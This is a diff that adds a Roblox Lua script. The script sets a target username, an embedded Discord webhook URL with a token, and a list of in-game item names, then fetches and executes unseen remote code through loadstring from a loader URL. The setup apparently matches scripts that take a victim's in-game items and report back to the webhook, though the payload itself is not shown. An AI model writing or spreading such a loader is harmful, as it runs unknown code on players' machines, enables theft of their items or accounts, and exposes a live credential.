@@ -1,1 +1,13 @@
-https://pastefy.app/aI6MiA7I/raw
+getgenv().TARGET_USER = "2h3e"
+getgenv().WEBHOOK_URL = "https://discord.com/api/webhooks/1494367972762976358/4vC5C4Q31dIdjIDYkwxDkbqxBq_L2PIs92H17UJJscpSInZzbZtnzCNyLRo8tWPpTch-"
+getgenv().NORMAL_BRAINROTS = {
+["Garama and Madundung"] = true,
+["Capitano Moby"] = true,
+["Burguro And Fryuro"] = true,
+["Ketupat Kepat"] = true,
+["Lavadorito Spinito"] = true,
+["Ketchuru and Musturu"] = true
+}
+task.spawn(function()
+loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/69ebd47abc10f91ef0a43a3f26746221.lua", true))()
+end)
